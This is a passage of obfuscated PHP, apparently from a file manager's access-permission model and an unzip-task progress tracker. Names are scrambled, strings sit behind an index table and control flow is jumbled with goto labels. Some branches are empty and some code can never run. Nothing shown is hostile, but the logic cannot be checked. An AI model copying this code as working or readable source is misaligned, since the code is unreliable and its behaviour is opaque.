B¶¯‰Ä«ô; B¶¯‰Ä«ô: $fÔ ¼—ÅìÚ = 1; $BÅÁº–ÁéÍ = $EØŠÍ¾½­¦[$aÌ‡»ãÇ[452]]; if ($BÅÁº–ÁéÍ != $fÔ ¼—ÅìÚ) { $bÄŒÅ‰­½ = array($aÌ‡»ãÇ[2064] => $BÅÁº–ÁéÍ); $dÔÎ‰ù¨ğæ = Model($aÌ‡»ãÇ[2138])->field($aÌ‡»ãÇ[1401])->where($bÄŒÅ‰­½)->select(); $dÔÎ‰ù¨ğæ = array_to_keyvalue($dÔÎ‰ù¨ğæ, $aÌ‡»ãÇ[33], $aÌ‡»ãÇ[1401]); } goto d’¡Ñ§–ì; F­Ãìñ¦Ï˜: $this->where(array($aÌ‡»ãÇ[380] => $fŒ†¤Ã‚Š))->delete(); $this->addAll($e½’ãÙÃÈ); return !0; goto eõ¦æ¸”‘ó; d’¡Ñ§–ì: $b¶ºÉ£ºÑË = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $e½’ãÙÃÈ = array(); foreach ($añŞè­ŒÉ as $e“¦’‘ïØ) { if (!in_array($e“¦’‘ïØ[$aÌ‡»ãÇ[368]], $b¶ºÉ£ºÑË)) { show_json(LNG($aÌ‡»ãÇ[2212]), !1); } if ($BÅÁº–ÁéÍ != $fÔ ¼—ÅìÚ) { if ($e“¦’‘ïØ[$aÌ‡»ãÇ[368]] == SourceModel::TYPE_GROUP) { } if ($e“¦’‘ïØ[$aÌ‡»ãÇ[452]] != 0 && !in_array($e“¦’‘ïØ[$aÌ‡»ãÇ[452]], $dÔÎ‰ù¨ğæ)) { } } if ($e“¦’‘ïØ[$aÌ‡»ãÇ[452]] == 0) { $e“¦’‘ïØ[$aÌ‡»ãÇ[368]] = SourceModel::TYPE_USER; } $e½’ãÙÃÈ[] = array($aÌ‡»ãÇ[366] => $fŒ†¤Ã‚Š, $aÌ‡»ãÇ[368] => intval($e“¦’‘ïØ[$aÌ‡»ãÇ[368]]), $aÌ‡»ãÇ[452] => intval($e“¦’‘ïØ[$aÌ‡»ãÇ[452]]), $aÌ‡»ãÇ[2192] => intval($e“¦’‘ïØ[$aÌ‡»ãÇ[2192]]) ? intval($e“¦’‘ïØ[$aÌ‡»ãÇ[2192]]) : 0, $aÌ‡»ãÇ[2193] => intval($e“¦’‘ïØ[$aÌ‡»ãÇ[2193]]) ? intval($e“¦’‘ïØ[$aÌ‡»ãÇ[2193]]) : -1); } goto F­Ãìñ¦Ï˜; eõ¦æ¸”‘ó: } public function authClear($aêš¯÷®‹°) { $EğÛåŠõØ =& $_SERVER[£ü]; $a¼Í—Ÿ›•Å = Model($EğÛåŠõØ[1100])->sourceInfo($aêš¯÷®‹°); $Fáä¬®†¥Š = array($aêš¯÷®‹°); if ($a¼Í—Ÿ›•Å[$EğÛåŠõØ[367]] == $EğÛåŠõØ[83]) { $ağë×İñÜæ = array($EğÛåŠõØ[521] => array($EğÛåŠõØ[479], $a¼Í—Ÿ›•Å[$EğÛåŠõØ[455]] . $aêš¯÷®‹° . $EğÛåŠõØ[480])); $Fáä¬®†¥Š = Model($EğÛåŠõØ[1100])->field($EğÛåŠõØ[380])->where($ağë×İñÜæ)->getField($EğÛåŠõØ[366], !0); $Fáä¬®†¥Š[] = $aêš¯÷®‹°; } $this->where(array($EğÛåŠõØ[380] => array($EğÛåŠõØ[381], $Fáä¬®†¥Š)))->delete(); return !0; } public function get($cĞ”Ìî–È·) { $EÁÙáÖÚà = $this->getSourceList(array($cĞ”Ìî–È·), !0); return $EÁÙáÖÚà[0]; } public function getSourceList($Fôè†à„ˆ, $f‰øØãà§‘ = false) { goto bŞì—¡‹ª„; AŞ’ÛÊß¹‰: $cêÛĞÊÎ­² = array($eˆƒÅ‚õÒ[380] => array($eˆƒÅ‚õÒ[381], $B½÷ÇÜ§™)); $CÌ‹…Íèê = $this->field($dÀîœ‘¾™£)->where($cêÛĞÊÎ­²)->select(); $CÌ‹…Íèê = array_to_keyvalue_group($CÌ‹…Íèê, $eˆƒÅ‚õÒ[366]); goto A†Ôïˆ¤á; bŞì—¡‹ª„: $eˆƒÅ‚õÒ =& $_SERVER[£ü]; if (!$Fôè†à„ˆ) { return array(); } $fĞòÍ“««Ñ = Model($eˆƒÅ‚õÒ[1100]); goto eâÓØéë©ë; dóÖŠÀ«õ: $B½÷ÇÜ§™ = array_values(array_unique($B½÷ÇÜ§™)); if (!$B½÷ÇÜ§™) { return array(); } $dÀîœ‘¾™£ = $eˆƒÅ‚õÒ[2214]; goto AŞ’ÛÊß¹‰; eâÓØéë©ë: if (!$f‰øØãà§‘) { $cêÛĞÊÎ­² = array($eˆƒÅ‚õÒ[380] => array($eˆƒÅ‚õÒ[381], $Fôè†à„ˆ)); $f‰øØãà§‘ = $fĞòÍ“««Ñ->field($eˆƒÅ‚õÒ[2213])->where($cêÛĞÊÎ­²)->select(); $f‰øØãà§‘ = array_to_keyvalue($f‰øØãà§‘, $eˆƒÅ‚õÒ[366]); } $B½÷ÇÜ§™ = $Fôè†à„ˆ; foreach ($f‰øØãà§‘ as $fé¥—ñ‚‹Æ => $d°–ƒ­¡¹ò) { $EŸÊ¶†…¤ = $fĞòÍ“««Ñ->parentLevelArray($d°–ƒ­¡¹ò[$eˆƒÅ‚õÒ[455]]); $B½÷ÇÜ§™ = array_merge($B½÷ÇÜ§™, $EŸÊ¶†…¤, array($fé¥—ñ‚‹Æ)); } goto dóÖŠÀ«õ; A†Ôïˆ¤á: $dğ“–‚¦ = array(); foreach ($f‰øØãà§‘ as $b˜¨Ì¶´Õ… => $d¾‰í°Ô) { $dğ“–‚¦[$b˜¨Ì¶´Õ…] = $this->makeSourceAuth($d¾‰í°Ô, $CÌ‹…Íèê); } return $dğ“–‚¦; goto cŞ¢á£—–¨; cŞ¢á£—–¨: } public function authDeepCheck($F´‚ÄÊ‘, $bóïÂ‡ ¼ = false) { $E»Ğæƒ…¶ˆ =& $_SERVER[£ü]; if (_get($GLOBALS, $E»Ğæƒ…¶ˆ[453])) { return !1; } $B’Ø·´¶Ø = $this->makeAuthDeep(); if (!in_array($F´‚ÄÊ‘, $B’Ø·´¶Ø)) { return !1; } return array($E»Ğæƒ…¶ˆ[374] => -1, $E»Ğæƒ…¶ˆ[414] => array($E»Ğæƒ…¶ˆ[382] => $E»Ğæƒ…¶ˆ[1021], $E»Ğæƒ…¶ˆ[2070] => $E»Ğæƒ…¶ˆ[464], $E»Ğæƒ…¶ˆ[383] => LNG($E»Ğæƒ…¶ˆ[2215]), $E»Ğæƒ…¶ˆ[2082] => $E»Ğæƒ…¶ˆ[2216])); } protected function makeAuthDeep() { goto f“£ŒÁÜÇä; f›ëŒºÂÑ‡: if ($b‡ÍÓóªØ) { $c‘¸´çóÇØ = array(array($C¾ÂöÕ„İ[368] => SourceModel::TYPE_USER, $C¾ÂöÕ„İ[452] => USER_ID), array($C¾ÂöÕ„İ[368] => SourceModel::TYPE_GROUP, $C¾ÂöÕ„İ[452] => array($C¾ÂöÕ„İ[381], $b‡ÍÓóªØ)), $C¾ÂöÕ„İ[904] => $C¾ÂöÕ„İ[2144]); } if ($bŒæ–Ù£í») { $c‘¸´çóÇØ = array($c‘¸´çóÇØ, $C¾ÂöÕ„İ[2192] => array($C¾ÂöÕ„İ[2218], $bŒæ–Ù£í»)); } $a·âÏÆ‡Ş¤ = $this->field($C¾ÂöÕ„İ[2219])->where($c‘¸´çóÇØ)->select(); goto dˆÑŠÖÌä¥; dÍ§Çêâ²ñ: $D‘Ğ•¢Ó°‹ = array_values(array_unique($D‘Ğ•¢Ó°‹)); foreach ($D‘Ğ•¢Ó°‹ as $B÷î§…‰ ) { $FƒòŠ¾òí = $EÒ²²«ôõš->getInfo($B÷î§…‰ ); $A¤¯‡ïï‚¥[] = $FƒòŠ¾òí[$C¾ÂöÕ„İ[388]][$C¾ÂöÕ„İ[366]]; } $A¤¯‡ïï‚¥ = array_values(array_unique($A¤¯‡ïï‚¥)); goto fØÖ¶øÓò; aÓğÎ©ê‰İ: $D ÓŠ™ñ˜ = Model($C¾ÂöÕ„İ[1100]); $EÒ²²«ôõš = Model($C¾ÂöÕ„İ[454]); if ($Eï˜˜‡Ä¬ğ) { $EÄŠ°çÈì• = $D ÓŠ™ñ˜->where(array($C¾ÂöÕ„İ[366] => array($C¾ÂöÕ„İ[381], $Eï˜˜‡Ä¬ğ)))->select(); foreach ($EÄŠ°çÈì• as $e´¯ˆÒä˜à) { $F¬¬ÅÊ—Ñ£ = $D ÓŠ™ñ˜->parentLevelArray($e´¯ˆÒä˜à[$C¾ÂöÕ„İ[455]]); $A¤¯‡ïï‚¥ = array_merge($A¤¯‡ïï‚¥, $F¬¬ÅÊ—Ñ£); $D‘Ğ•¢Ó°‹[] = $e´¯ˆÒä˜à[$C¾ÂöÕ„İ[452]]; } } goto F‡õ´¼¡; cò‘íÇƒ¾È: $aÇ³ËÄêßˆ = Model($C¾ÂöÕ„İ[2217])->listData(); $bŒæ–Ù£í» = array(); foreach ($aÇ³ËÄêßˆ as $E©çéÇ¢ÓÌ) { if ($E©çéÇ¢ÓÌ[$C¾ÂöÕ„İ[373]] == 0 && $E©çéÇ¢ÓÌ[$C¾ÂöÕ„İ[2084]] == $C¾ÂöÕ„İ[83]) { $bŒæ–Ù£í»[] = $E©çéÇ¢ÓÌ[$C¾ÂöÕ„İ[364]]; } } goto D¤©ÄÃçŒœ; D¤©ÄÃçŒœ: $b‡ÍÓóªØ = Session::get($C¾ÂöÕ„İ[2176]); $b‡ÍÓóªØ = array_to_keyvalue($b‡ÍÓóªØ, $C¾ÂöÕ„İ[33], $C¾ÂöÕ„İ[2064]); $c‘¸´çóÇØ = array($C¾ÂöÕ„İ[368] => SourceModel::TYPE_USER, $C¾ÂöÕ„İ[452] => USER_ID); goto f›ëŒºÂÑ‡; dˆÑŠÖÌä¥: $Eï˜˜‡Ä¬ğ = array_to_keyvalue($a·âÏÆ‡Ş¤, $C¾ÂöÕ„İ[33], $C¾ÂöÕ„İ[366]); $A¤¯‡ïï‚¥ = array(); $D‘Ğ•¢Ó°‹ = $b‡ÍÓóªØ; goto aÓğÎ©ê‰İ; F‡õ´¼¡: $D‘Ğ•¢Ó°‹ = array_values(array_unique($D‘Ğ•¢Ó°‹)); $fßŞêİ‹Š = $D‘Ğ•¢Ó°‹; foreach ($fßŞêİ‹Š as $B÷î§…‰ ) { $FƒòŠ¾òí = $EÒ²²«ôõš->getInfo($B÷î§…‰ ); $F¬¬ÅÊ—Ñ£ = $D ÓŠ™ñ˜->parentLevelArray($FƒòŠ¾òí[$C¾ÂöÕ„İ[455]]); $D‘Ğ•¢Ó°‹ = array_merge($D‘Ğ•¢Ó°‹, $F¬¬ÅÊ—Ñ£); } goto dÍ§Çêâ²ñ; fØÖ¶øÓò: return $A¤¯‡ïï‚¥; goto F•ôÌåÛ–Ä; f“£ŒÁÜÇä: $C¾ÂöÕ„İ =& $_SERVER[£ü]; static $A¤¯‡ïï‚¥ = false; if ($A¤¯‡ïï‚¥) { return $A¤¯‡ïï‚¥; } goto cò‘íÇƒ¾È; F•ôÌåÛ–Ä: } private function makeSourceAuth($EÃÎºÏ…øñ, $c©¢§âÈòµ) { goto B˜³óÔîä; fñ·¢»¦ïÓ: $aàøö³ä± = array_merge(array($EÃÎºÏ…øñ[$f†ªÑì®Ø‚[366]]), array_reverse($aàøö³ä±)); $b²½¥ì¨ƒà = !1; foreach ($aàøö³ä± as $B¦´õË•’) { if (!isset($c©¢§âÈòµ[$B¦´õË•’])) { continue; } $d®á²³á = $this->authMake($c©¢§âÈòµ[$B¦´õË•’]); if ($d®á²³á[$f†ªÑì®Ø‚[414]]) { $b²½¥ì¨ƒà = $d®á²³á; break; } } goto A‘’õÇ²¬Ñ; A‘’õÇ²¬Ñ: if (!$b²½¥ì¨ƒà) { $b†ô‡‹â¬ = array_to_keyvalue($b†ô‡‹â¬, $f†ªÑì®Ø‚[2064]); $E‡ó„‚ÕÖŒ = $EÃÎºÏ…øñ[$f†ªÑì®Ø‚[452]]; $B“ÚÀá¬ò = isset($b†ô‡‹â¬[$E‡ó„‚ÕÖŒ]) ? $b†ô‡‹â¬[$E‡ó„‚ÕÖŒ] : !1; if ($B“ÚÀá¬ò) { $b²½¥ì¨ƒà = array($f†ªÑì®Ø‚[2220] => intval($B“ÚÀá¬ò[$f†ªÑì®Ø‚[373]][$f†ªÑì®Ø‚[373]]), $f†ªÑì®Ø‚[2221] => $B“ÚÀá¬ò[$f†ªÑì®Ø‚[373]]); } } if ((!$b²½¥ì¨ƒà || $b²½¥ì¨ƒà[$f†ªÑì®Ø‚[374]] <= 0) && $EÃÎºÏ…øñ[$f†ªÑì®Ø‚[368]] == SourceModel::TYPE_GROUP) { $B³³ãºçµÏ = $this->authDeepCheck($EÃÎºÏ…øñ[$f†ªÑì®Ø‚[366]], $b²½¥ì¨ƒà); if ($B³³ãºçµÏ) { $b²½¥ì¨ƒà = $B³³ãºçµÏ; } } return $b²½¥ì¨ƒà; goto f¹‚ôÃƒŒ; B˜³óÔîä: $f†ªÑì®Ø‚ =& $_SERVER[£ü]; $b†ô‡‹â¬ = Session::get($f†ªÑì®Ø‚[2176]); $aàøö³ä± = Model($f†ªÑì®Ø‚[1100])->parentLevelArray($EÃÎºÏ…øñ[$f†ªÑì®Ø‚[455]]); goto fñ·¢»¦ïÓ; f¹‚ôÃƒŒ: } public function authOwnerApply($fñºˆÛ„Â¸) { goto E´µÁ˜‘®ã; EÖˆù†Ñ¾: $A‘Ú†·õğ« = array($BåªÆÛš·¾[380] => array($BåªÆÛš·¾[381], $DÇøöÀ‡­º)); $Féá“¸“è = $this->field($aæÒå³ãš‘)->where($A‘Ú†·õğ«)->select(); $Féá“¸“è = array_to_keyvalue_group($Féá“¸“è, $BåªÆÛš·¾[366]); goto f•ÃÆçƒ²ã; f•ÃÆçƒ²ã: $DÒàÜ¿­Ğå = array(); $f„îößàÊ = array(); foreach ($Féá“¸“è as $BÁâ – Ó => $DÙ´™ÃÅö†) { $EâØÕÁ‹º = $this->authFolderOwnerUser($DÙ´™ÃÅö†); $DÒàÜ¿­Ğå[$BÁâ – Ó] = $EâØÕÁ‹º; $f„îößàÊ = array_merge($f„îößàÊ, $EâØÕÁ‹º[$BåªÆÛš·¾[531]]); if ($EâØÕÁ‹º[$BåªÆÛš·¾[2223]]) { break; } } goto A·ÙÂ¯Ú Ğ; E´µÁ˜‘®ã: $BåªÆÛš·¾ =& $_SERVER[£ü]; if (empty($fñºˆÛ„Â¸[$BåªÆÛš·¾[373]]) || isset($fñºˆÛ„Â¸[$BåªÆÛš·¾[2222]]) && $fñºˆÛ„Â¸[$BåªÆÛš·¾[2222]]) { return $fñºˆÛ„Â¸; } if (AuthModel::authCheckRoot($fñºˆÛ„Â¸[$BåªÆÛš·¾[373]][$BåªÆÛš·¾[374]])) { return $fñºˆÛ„Â¸; } goto F“ˆ¢Àì˜; F“ˆ¢Àì˜: $DÇøöÀ‡­º = Model($BåªÆÛš·¾[1100])->parentLevelArray($fñºˆÛ„Â¸[$BåªÆÛš·¾[455]]); $DÇøöÀ‡­º = array_merge(array($fñºˆÛ„Â¸[$BåªÆÛš·¾[366]]), array_reverse($DÇøöÀ‡­º)); $aæÒå³ãš‘ = $BåªÆÛš·¾[2214]; goto EÖˆù†Ñ¾; A·ÙÂ¯Ú Ğ: if (count($f„îößàÊ) == 0) { $f„îößàÊ = $this->authFolderOwnerGroup($fñºˆÛ„Â¸[$BåªÆÛš·¾[452]]); } $f„îößàÊ = array_unique($f„îößàÊ); if (AuthModel::authCheckRoot($fñºˆÛ„Â¸[$BåªÆÛš·¾[373]][$BåªÆÛš·¾[374]])) { $f„îößàÊ[] = USER_ID; } goto eÑƒ¶ğßÜŸ; eÑƒ¶ğßÜŸ: $fñºˆÛ„Â¸[$BåªÆÛš·¾[373]][$BåªÆÛš·¾[2224]] = Model($BåªÆÛš·¾[470])->userListInfo($f„îößàÊ); return $fñºˆÛ„Â¸; goto F¾ÚÛÀÛÑ¨; F¾ÚÛÀÛÑ¨: } private function authFolderOwnerGroup($f­ŒÑ«Œ‹¡) { $E‰°â¯Úğ‚ =& $_SERVER[£ü]; $FÎÅÑÖŒí = Model($E‰°â¯Úğ‚[2138])->where(array($E‰°â¯Úğ‚[2064] => $f­ŒÑ«Œ‹¡))->select(); $f£À‘­ãÏ = array(); if (!$FÎÅÑÖŒí) { return $f£À‘­ãÏ; } foreach ($FÎÅÑÖŒí as $e°ùÌŠ†ªË) { $C‹İ­ç°‘Ø = $this->authInfo($e°ùÌŠ†ªË); if (AuthModel::authCheckRoot($C‹İ­ç°‘Ø[$E‰°â¯Úğ‚[373]])) { $f£À‘­ãÏ[] = $e°ùÌŠ†ªË[$E‰°â¯Úğ‚[1401]]; } } return $f£À‘­ãÏ; } private function authFolderOwnerUser($dÓ¾•éÔ‘å) { $BÒ…ìõÖ÷ =& $_SERVER[£ü]; $eñ¡òéŒ´ = array(); $B—ÏÒƒëÃù = !1; foreach ($dÓ¾•éÔ‘å as $CŸªë—£©) { $D¢ù§î† = $this->authInfo($CŸªë—£©); if ($CŸªë—£©[$BÒ…ìõÖ÷[452]] == $BÒ…ìõÖ÷[464]) { $B—ÏÒƒëÃù = !0; } if ($CŸªë—£©[$BÒ…ìõÖ÷[368]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($D¢ù§î†[$BÒ…ìõÖ÷[373]])) { $eñ¡òéŒ´[] = $CŸªë—£©[$BÒ…ìõÖ÷[452]]; } } } return array($BÒ…ìõÖ÷[531] => $eñ¡òéŒ´, $BÒ…ìõÖ÷[2223] => $B—ÏÒƒëÃù); } public function authMake($d³ ‚÷ç¼Í) { goto dËğÔéËÅ‘; eºÍ–Ä¤ï: $CÁ» ¸ÜĞ = 0; foreach ($d³ ‚÷ç¼Í as $A‘Û„»·äÁ) { $fßÖ¤ğ£ª• = $this->authInfo($A‘Û„»·äÁ); $e¬…‚ªîã¬ = $A‘Û„»·äÁ[$cÎ¿†Ş¸[452]]; $AÙµ´–¿Ÿ = intval($fßÖ¤ğ£ª•[$cÎ¿†Ş¸[373]]); if ($A‘Û„»·äÁ[$cÎ¿†Ş¸[368]] == SourceModel::TYPE_USER && $e¬…‚ªîã¬ == USER_ID) { $A­°Ù‡õâ = !0; $Dà‡‡‘„¼Œ = $fßÖ¤ğ£ª•; $F“à‰Ñ™’î = $AÙµ´–¿Ÿ; } else { if ($A‘Û„»·äÁ[$cÎ¿†Ş¸[368]] == SourceModel::TYPE_GROUP && in_array($e¬…‚ªîã¬, $D‹Ôæœö¾í)) { $bÁµ”Î¼Š = !0; if ($AÙµ´–¿Ÿ >= $bªÒÜ§ßÇ) { $bªÒÜ§ßÇ = $AÙµ´–¿Ÿ; $f¬÷½å˜×  = $fßÖ¤ğ£ª•; } } else { if ($e¬…‚ªîã¬ == $cÎ¿†Ş¸[464]) { $CÁ» ¸ÜĞ = !0; $CãçŸ»¨ï = $fßÖ¤ğ£ª•; $fùÖ©Åßˆ“ = $AÙµ´–¿Ÿ; } } } } $c‰©æ¬Úô˜ = $A­°Ù‡õâ ? $F“à‰Ñ™’î : ($bÁµ”Î¼Š ? $bªÒÜ§ßÇ : $fùÖ©Åßˆ“); goto aµâ…•ø³¾; aµâ…•ø³¾: $fßÖ¤ğ£ª• = $A­°Ù‡õâ ? $Dà‡‡‘„¼Œ : ($bÁµ”Î¼Š ? $f¬÷½å˜×  : $CãçŸ»¨ï); $EÊ¨âôœÕç = array($cÎ¿†Ş¸[2220] => intval($c‰©æ¬Úô˜), $cÎ¿†Ş¸[2221] => $fßÖ¤ğ£ª•); return $EÊ¨âôœÕç; goto Cì»õÊ—İÒ; dËğÔéËÅ‘: $cÎ¿†Ş¸ =& $_SERVER[£ü]; if (!$d³ ‚÷ç¼Í) { return array($cÎ¿†Ş¸[374] => 0, $cÎ¿†Ş¸[414] => !1); } $dÍƒ½¿Ø÷ = Session::get($cÎ¿†Ş¸[2176]); goto D¤íˆšš•¡; BË¹ÊİÛ: $fùÖ©Åßˆ“ = 0; $Dà‡‡‘„¼Œ = 0; $f¬÷½å˜×  = 0; goto cå¯ÆŠØÅÁ; cå¯ÆŠØÅÁ: $CãçŸ»¨ï = 0; $A­°Ù‡õâ = 0; $bÁµ”Î¼Š = 0; goto eºÍ–Ä¤ï; D¤íˆšš•¡: $D‹Ôæœö¾í = array_to_keyvalue($dÍƒ½¿Ø÷, $cÎ¿†Ş¸[33], $cÎ¿†Ş¸[2064]); $F“à‰Ñ™’î = 0; $bªÒÜ§ßÇ = 0; goto BË¹ÊİÛ; Cì»õÊ—İÒ: } public function authTargetInfoMake($E¬«îÑ¬ë) { goto EÊÅğôäôï; B½ïµéÄò‚: return array($FÍ‡…¿ôÅ[2225] => $D¦éÚ—Ö¿, $FÍ‡…¿ôÅ[2226] => $eÁâ‡Ê‡Ÿ); goto aãàÍåäé¤; fµ¼·İà: foreach ($E¬«îÑ¬ë as $EŠ¼µŒ‘ƒö) { if ($EŠ¼µŒ‘ƒö[$FÍ‡…¿ôÅ[368]] == SourceModel::TYPE_USER) { $D¦éÚ—Ö¿[] = intval($EŠ¼µŒ‘ƒö[$FÍ‡…¿ôÅ[452]]); } else { if ($EŠ¼µŒ‘ƒö[$FÍ‡…¿ôÅ[368]] == SourceModel::TYPE_GROUP) { $eÁâ‡Ê‡Ÿ[] = intval($EŠ¼µŒ‘ƒö[$FÍ‡…¿ôÅ[452]]); } } } if ($D¦éÚ—Ö¿) { $D¦éÚ—Ö¿ = Model($FÍ‡…¿ôÅ[470])->userListInfo($D¦éÚ—Ö¿); } if ($eÁâ‡Ê‡Ÿ) { $cŞßñÇõÄ = array($FÍ‡…¿ôÅ[2136] => array($FÍ‡…¿ôÅ[381], $eÁâ‡Ê‡Ÿ)); $eÁâ‡Ê‡Ÿ = Model($FÍ‡…¿ôÅ[454])->field($FÍ‡…¿ôÅ[2149])->where($cŞßñÇõÄ)->select(); $eÁâ‡Ê‡Ÿ = array_to_keyvalue($eÁâ‡Ê‡Ÿ, $FÍ‡…¿ôÅ[2064]); } goto B½ïµéÄò‚; EÊÅğôäôï: $FÍ‡…¿ôÅ =& $_SERVER[£ü]; $D¦éÚ—Ö¿ = array(); $eÁâ‡Ê‡Ÿ = array(); goto fµ¼·İà; aãàÍåäé¤: } private function authInfo($CÇë‹àÂÍ) { $f³†µçù†– =& $_SERVER[£ü]; if ($CÇë‹àÂÍ[$f³†µçù†–[2192]]) { $e²æ¢Ñ®Ø¨ = Model($f³†µçù†–[2211])->listData($CÇë‹àÂÍ[$f³†µçù†–[2192]]); if (!$e²æ¢Ñ®Ø¨) { return !1; $aÙÀ¿½Ö“à = Model($f³†µçù†–[2211])->listData(); $E–”¢İ“òÉ = array_filter_by_field($aÙÀ¿½Ö“à, $f³†µçù†–[373], $f³†µçù†–[464]); return $E–”¢İ“òÉ; } $F¾ˆê¦œÌ = array_field_key($e²æ¢Ñ®Ø¨, array($f³†µçù†–[364], $f³†µçù†–[28], $f³†µçù†–[373], $f³†µçù†–[2082], $f³†µçù†–[2085])); $F¾ˆê¦œÌ[$f³†µçù†–[2227]] = $CÇë‹àÂÍ; return $F¾ˆê¦œÌ; } else { return array($f³†µçù†–[382] => 0, $f³†µçù†–[2070] => $CÇë‹àÂÍ[$f³†µçù†–[2193]], $f³†µçù†–[383] => $f³†µçù†–[33], $f³†µçù†–[2082] => $f³†µçù†–[2228]); } } } goto cê¨Ò¾ÍæÆ; f¸ˆ…±‹â¬: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto b¥ÙÑï„É; cÎÕ¾·Õã: if (!$C™‚ÅìœÈ[$cš©•î[1309]]) { $C™‚ÅìœÈ[$cš©•î[1309]] = LNG($cš©•î[1470]); } goto dÉ‰‚ Î³; b¥ÙÑï„É: $cš©•î =& $_SERVER[£ü]; parent::startAfter(); Hook::bind($cš©•î[1466], array($this, $cš©•î[1467])); goto b•ë‘’‚£; b•ë‘’‚£: Hook::bind($cš©•î[1025], array($this, $cš©•î[1468])); $C™‚ÅìœÈ =& $this->task; $C™‚ÅìœÈ[$cš©•î[1469]] = $cš©•î[1030]; goto cÎÕ¾·Õã; dÉ‰‚ Î³: } protected function endAfter() { $d¡™ğÑ¦æ =& $_SERVER[£ü]; parent::endAfter(); Hook::unbind($d¡™ğÑ¦æ[1466], array($this, $d¡™ğÑ¦æ[1467])); Hook::unbind($d¡™ğÑ¦æ[1025], array($this, $d¡™ğÑ¦æ[1468])); } public function updateAfter() { $Dµá«ªø› =& $_SERVER[£ü]; $FÅÔœÊË¬¡ =& $this->task; if (!$FÅÔœÊË¬¡[$Dµá«ªø›[966]] || !$FÅÔœÊË¬¡[$Dµá«ªø›[687]]) { return; } if ($FÅÔœÊË¬¡[$Dµá«ªø›[1469]] == $Dµá«ªø›[1030]) { $a‹¿™¾ÂŠª = 0; if ($FÅÔœÊË¬¡[$Dµá«ªø›[1446]]) { $a‹¿™¾ÂŠª = $FÅÔœÊË¬¡[$Dµá«ªø›[1447]] / $FÅÔœÊË¬¡[$Dµá«ªø›[1446]]; } $FÅÔœÊË¬¡[$Dµá«ªø›[1402]] = $a‹¿™¾ÂŠª * 0.3; } else { if ($FÅÔœÊË¬¡[$Dµá«ªø›[1469]] == $Dµá«ªø›[298]) { $a‹¿™¾ÂŠª = $FÅÔœÊË¬¡[$Dµá«ªø›[978]] / $FÅÔœÊË¬¡[$Dµá«ªø›[966]]; $FÅÔœÊË¬¡[$Dµá«ªø›[1402]] = 0.3 + $a‹¿™¾ÂŠª * 0.4; } else { if ($FÅÔœÊË¬¡[$Dµá«ªø›[1469]] == $Dµá«ªø›[91]) { $Bªš³‰ß¸‡ = 0; if ($FÅÔœÊË¬¡[$Dµá«ªø›[1448]] == $Dµá«ªø›[91]) { $Bªš³‰ß¸‡ = $FÅÔœÊË¬¡[$Dµá«ªø›[1447]]; } $a‹¿™¾ÂŠª = ($FÅÔœÊË¬¡[$Dµá«ªø›[1451]] + $Bªš³‰ß¸‡) / $FÅÔœÊË¬¡[$Dµá«ªø›[687]]; $FÅÔœÊË¬¡[$Dµá«ªø›[1402]] = 0.3 + 0.4 + $a‹¿™¾ÂŠª * 0.3; } } } if ($FÅÔœÊË¬¡[$Dµá«ªø›[1402]] > 0) { $d›¤Ç³‹İ = timeFloat() - $FÅÔœÊË¬¡[$Dµá«ªø›[1404]] - $FÅÔœÊË¬¡[$Dµá«ªø›[1407]]; $FÅÔœÊË¬¡[$Dµá«ªø›[1408]] = $d›¤Ç³‹İ * (1 - $FÅÔœÊË¬¡[$Dµá«ªø›[1402]]) / $FÅÔœÊË¬¡[$Dµá«ªø›[1402]]; } } public function addFile($Bçƒ×Ü¢ò) { goto f¯ªÀØ‰å; f¯ªÀØ‰å: $C´÷‰Ô‡­ =& $_SERVER[£ü]; $AÒŒÎùÓ„ä =& $this->task; $b·„å‘áæ = IO::info($Bçƒ×Ü¢ò); goto F‹Œáì è; CÜ’ËĞİÎ¾: $AÒŒÎùÓ„ä[$C´÷‰Ô‡­[968]] = $C´÷‰Ô‡­[1459]; $AÒŒÎùÓ„ä[$C´÷‰Ô‡­[1448]] = $C´÷‰Ô‡­[1030]; $AÒŒÎùÓ„ä[$C´÷‰Ô‡­[687]] = $b·„å‘áæ[$C´÷‰Ô‡­[77]]; goto d÷‘¸À‡Ïá; d÷‘¸À‡Ïá: $AÒŒÎùÓ„ä[$C´÷‰Ô‡­[966]] = 1; $C‹µÖôõÕé = 0; $AÒŒÎùÓ„ä[$C´÷‰Ô‡­[1452]] = array($C´÷‰Ô‡­[1453] => $C‹µÖôõÕé + 1, $C´÷‰Ô‡­[383] => $b·„å‘áæ[$C´÷‰Ô‡­[28]], $C´÷‰Ô‡­[75] => $b·„å‘áæ[$C´÷‰Ô‡­[75]], $C´÷‰Ô‡­[462] => $b·„å‘áæ[$C´÷‰Ô‡­[462]] ? $b·„å‘áæ[$C´÷‰Ô‡­[462]] : $b·„å‘áæ[$C´÷‰Ô‡­[75]]); goto fäø²ñÆóË; fäø²ñÆóË: $this->update(); goto d¶É¶ÁŞ‡; F‹Œáì è: $AÒŒÎùÓ„ä[$C´÷‰Ô‡­[1444]] = $b·„å‘áæ[$C´÷‰Ô‡­[28]]; $AÒŒÎùÓ„ä[$C´÷‰Ô‡­[1446]] = $b·„å‘áæ[$C´÷‰Ô‡­[77]]; $AÒŒÎùÓ„ä[$C´÷‰Ô‡­[1447]] = 0; goto CÜ’ËĞİÎ¾; d¶É¶ÁŞ‡: } public function unzipAfter($C¶ëô’â) { goto b‘ÚòÄÉ£ì; bºÆ¼êˆì : $cÕ»ßÀ‹¦À[$D•÷ÌÄä…§[1444]] = $D•÷ÌÄä…§[33]; $cÕ»ßÀ‹¦À[$D•÷ÌÄä…§[1451]] = 0; $cÕ»ßÀ‹¦À[$D•÷ÌÄä…§[687]] = $f–°Ğ‚¡äƒ[$D•÷ÌÄä…§[77]]; goto A„ªóîŞî; C‘š  ß…¾: $cÕ»ßÀ‹¦À[$D•÷ÌÄä…§[978]] = 0; $cÕ»ßÀ‹¦À[$D•÷ÌÄä…§[1446]] = 0; $cÕ»ßÀ‹¦À[$D•÷ÌÄä…§[1447]] = 0; goto bºÆ¼êˆì ; Fìœ°¶œ·×: $f–°Ğ‚¡äƒ = IO::infoWithChildren($C¶ëô’â); $bÙ°ê©ÖŠò = 0; $cÕ»ßÀ‹¦À[$D•÷ÌÄä…§[1452]] = array($D•÷ÌÄä…§[1453] => $bÙ°ê©ÖŠò + 1, $D•÷ÌÄä…§[383] => $f–°Ğ‚¡äƒ[$D•÷ÌÄä…§[28]], $D•÷ÌÄä…§[75] => 